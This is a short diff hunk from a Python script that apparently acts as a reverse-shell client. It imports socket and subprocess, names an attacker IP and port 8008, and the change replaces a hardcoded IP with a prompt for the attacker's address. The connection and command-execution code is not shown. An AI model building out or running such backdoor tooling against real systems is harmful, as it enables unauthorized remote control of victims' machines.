@@ -2,7 +2,7 @@ from os import times
 import socket
 import subprocess
 
-hacker_IP = '192.168.43.138'
+hacker_IP = input("Enter the IP address of attacker")
 hacker_PORT = 8008
 IDENTIFIER = "<END_OF_COMMAND_RESULT>"
 
